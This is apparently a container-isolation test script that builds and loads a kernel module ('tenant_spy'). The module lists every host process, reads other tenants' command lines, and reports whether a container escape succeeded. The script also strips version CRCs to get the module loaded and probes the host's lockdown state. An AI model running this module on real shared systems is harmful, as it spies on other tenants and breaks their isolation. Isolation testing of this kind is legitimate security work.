# Create a simple kernel module that can access all processes
mkdir -p /tmp/kmod_test
cd /tmp/kmod_test
# Create the kernel module source
cat > tenant_spy.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/mm.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Tenant isolation test module");
MODULE_VERSION("1.0");

static struct proc_dir_entry *proc_entry;

// Function to read process cmdline
static int get_process_cmdline(struct task_struct *task, char *buffer, int buf_size) {
    struct mm_struct *mm;
    char *cmdline;
    int len = 0;
    unsigned long arg_start, arg_end;
    
    if (!task || !buffer || buf_size <= 0)
        return 0;
    
    mm = get_task_mm(task);
    if (!mm)
        return 0;
    
    arg_start = mm->arg_start;
    arg_end = mm->arg_end;
    
    if (arg_start >= arg_end) {
        mmput(mm);
        return 0;
    }
    
    len = arg_end - arg_start;
    if (len > buf_size - 1)
        len = buf_size - 1;
    
    cmdline = kmalloc(len + 1, GFP_KERNEL);
    if (!cmdline) {
        mmput(mm);
        return 0;
    }
    
    if (access_process_vm(task, arg_start, cmdline, len, FOLL_FORCE) == len) {
        cmdline[len] = '\0';
        // Replace null bytes with spaces for readability
        int i;
        for (i = 0; i < len; i++) {
            if (cmdline[i] == '\0')
                cmdline[i] = ' ';
        }
        strncpy(buffer, cmdline, buf_size - 1);
        buffer[buf_size - 1] = '\0';
        len = strlen(buffer);
    } else {
        len = 0;
    }
    
    kfree(cmdline);
    mmput(mm);
    return len;
}

static ssize_t tenant_spy_read(struct file *file, char __user *buffer, size_t count, loff_t *pos) {
    struct task_struct *task;
    char *output;
    char cmdline_buf[256];
    int len = 0;
    int process_count = 0;
    int found_tenant2 = 0;
    size_t output_size = 32768; // Even larger buffer
    ssize_t ret;
    
    if (*pos > 0) return 0;
    
    // Allocate kernel memory for output buffer
    output = kmalloc(output_size, GFP_KERNEL);
    if (!output) {
        return -ENOMEM;
    }
    
    len += snprintf(output + len, output_size - len, "KERNEL_MODULE_LOADED: Scanning all processes...\n");
    
    rcu_read_lock();
    for_each_process(task) {
        // Check if we have enough space left
        if (len >= output_size - 1000) {
            len += snprintf(output + len, output_size - len, "... (truncated due to buffer limit)\n");
            break;
        }
        
        // Get process cmdline
        memset(cmdline_buf, 0, sizeof(cmdline_buf));
        get_process_cmdline(task, cmdline_buf, sizeof(cmdline_buf));
        
        process_count++;
        
        // Check for tenant2 in both comm and cmdline
        if (strstr(task->comm, "tenant2") || strstr(cmdline_buf, "tenant2") || 
            strstr(task->comm, "target") || strstr(cmdline_buf, "echo tenant2")) {
            len += snprintf(output + len, output_size - len, 
                          "TENANT2_PROCESS_FOUND: PID=%d COMM=%.16s CMDLINE=%s\n", 
                          task->pid, task->comm, cmdline_buf);
            found_tenant2 = 1;
        }
    }
    rcu_read_unlock();
    
    len += snprintf(output + len, output_size - len, "TOTAL_PROCESSES_VISIBLE: %d\n", process_count);
    
    if (found_tenant2) {
        len += snprintf(output + len, output_size - len, "CONTAINER_ESCAPE_SUCCESS: Kernel module can see tenant2 processes!\n");
    } else {
        len += snprintf(output + len, output_size - len, "No tenant2 processes found from kernel space\n");
    }
    
    if (process_count > 20) {
        len += snprintf(output + len, output_size - len, "HOST_PROCESS_VISIBLE: Can see %d processes - possible container escape\n", process_count);
    }
    
    if (len > count) {
        len = count;
    }
    
    if (copy_to_user(buffer, output, len)) {
        ret = -EFAULT;
    } else {
        *pos += len;
        ret = len;
    }
    
    kfree(output);
    return ret;
}

static const struct proc_ops tenant_spy_ops = {
    .proc_read = tenant_spy_read,
};

static int __init tenant_spy_init(void) {
    proc_entry = proc_create("tenant_spy", 0444, NULL, &tenant_spy_ops);
    if (!proc_entry) {
        printk(KERN_ERR "Failed to create /proc/tenant_spy\n");
        return -ENOMEM;
    }
    printk(KERN_INFO "Tenant spy module loaded\n");
    return 0;
}

static void __exit tenant_spy_exit(void) {
    if (proc_entry) {
        proc_remove(proc_entry);
    }
    printk(KERN_INFO "Tenant spy module unloaded\n");
}

module_init(tenant_spy_init);
module_exit(tenant_spy_exit);
EOF

# Build against the host distro's kernel build tree ($KDIR).
# kbuild reads obj-m from a Kbuild/Makefile in the module directory (M=),
# not from the command line, so write one next to the source. Without it
# kbuild tries to include a Makefile in M= and fails 'No rule to make
# target Makefile'.
echo 'obj-m := tenant_spy.o' > Kbuild
echo 'Compiling kernel module...'
if make -C "$KDIR" M="$PWD" modules; then
  echo 'BUILD_OK'
  # Strip symbol-version CRCs. The headers are the running kernel's own,
  # so the ABI already matches; only the Module.symvers bookkeeping is
  # missing, which makes the CRC check redundant. This lets the module
  # load on CONFIG_MODVERSIONS=y kernels, the common case.
  objcopy -R __versions tenant_spy.ko 2>/dev/null || true
  echo 'Loading kernel module...'
  insmod_err=$(insmod tenant_spy.ko 2>&1)
  insmod_rc=$?
  if [ $insmod_rc -eq 0 ]; then
    echo 'MODULE_LOADED: Module loaded successfully'
    # Give the target pod a moment, then read the global task list.
    sleep 10
    if [ -f /proc/tenant_spy ]; then
      cat /proc/tenant_spy
    else
      echo 'Proc entry not created'
    fi
    rmmod tenant_spy 2>/dev/null || true
  else
    echo "insmod failed: $insmod_err"
    # Why the load was refused decides the verdict, so report the host's
    # module-gating state rather than guessing. EPERM here is almost
    # always kernel lockdown (Secure Boot: lockdown=integrity), which
    # refuses unsigned modules in-kernel no matter the capabilities — a
    # host protection, not tenant isolation, and uniform across every
    # solution on that host.
    ld=$(cat /sys/kernel/security/lockdown 2>/dev/null || echo n/a)
    se=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null || echo n/a)
    md=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null || echo n/a)
    echo "LOCKDOWN_STATE: lockdown=$ld sig_enforce=$se modules_disabled=$md"
    # A user namespace is the other EPERM cause when lockdown is off:
    # module loading needs CAP_SYS_MODULE in the INIT userns, but a mapped
    # container holds it only within its own, so CapEff reads full yet the
    # load is refused. An identity map is '0 0 4294967295'; anything else
    # is a userns (typically a rootless runtime, or the platform remapping
    # capabilities as a deliberate isolation mechanism).
    um=$(tr -s ' ' < /proc/self/uid_map 2>/dev/null | tr '\n' ';')
    echo "USERNS_UID_MAP: ${um:-unavailable}"
    # The reason decides the verdict, so classify it rather than lumping
    # every failure together. A denied privileged op is confinement; a
    # build/load artefact is inconclusive.
    case "$insmod_err" in
      *'Required key'*|*'Key was rejected'*)
        echo 'MODULE_SIG_REQUIRED: kernel demands a signed module' ;;
      *'not permitted'*)
        echo 'MODULE_DENIED_EPERM: privileged module load refused despite capabilities' ;;
      *)
        echo 'MODULE_LOAD_FAILED_TOOLING: could not load the compiled module' ;;
    esac
  fi
else
  echo 'BUILD_FAILED: module compilation failed'
fi
echo 'Kernel module container escape test completed'
exit 0
